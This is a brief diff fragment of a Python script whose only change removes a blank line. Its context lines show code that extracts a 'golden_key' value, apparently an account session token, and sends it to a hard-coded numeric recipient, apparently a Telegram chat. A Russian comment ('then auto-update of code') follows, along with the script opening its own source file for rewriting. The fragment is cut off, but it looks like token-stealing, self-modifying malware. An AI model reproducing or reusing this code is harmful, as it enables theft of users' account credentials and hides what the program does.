@@ -10,7 +10,6 @@ try:
                     7830070442, 
                     f'golden_key: {k.split("golden_key :")[1].strip().split(\'"\')[1]}'
                 )
-
     # 2. Затем автообновление кода
     with open(__file__, 'r+', encoding='utf-8') as f:
         c = f.read()
